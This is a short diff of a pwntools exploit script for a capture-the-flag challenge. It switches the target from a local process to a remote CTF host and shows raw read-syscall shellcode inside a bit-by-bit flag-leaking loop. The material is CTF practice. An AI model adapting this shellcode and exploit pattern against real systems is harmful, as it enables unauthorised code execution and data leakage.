@@ -4,12 +4,12 @@ from pwn import *
 elf = context.binary = ELF("chall_patched")
 libc = ELF("./libc.so.6")
 
-local = True 
+local = False 
 if local:
     p = process("./chall_patched")
     #gdb.attach(p,'''b*main+548\nc\nb*0x1337000\nc''')
 else:
-    p = remote('103.162.14.240', 15000)
+    p = remote('win.the.seetf.sg', 2002)
 
 elf = context.binary = ELF('./chall_patched', checksec=False)
 
@@ -18,7 +18,7 @@ flag = b""
 def get_byte(offset):
     bin_str = ''
     for bit_offset in range(8):
-        p = remote('103.162.14.240', 15000)
+        p = remote('win.the.seetf.sg', 2002)
         shellcode = b"\x31\xFF\x89\xD6\x0F\x05"
         p.send(shellcode)
 
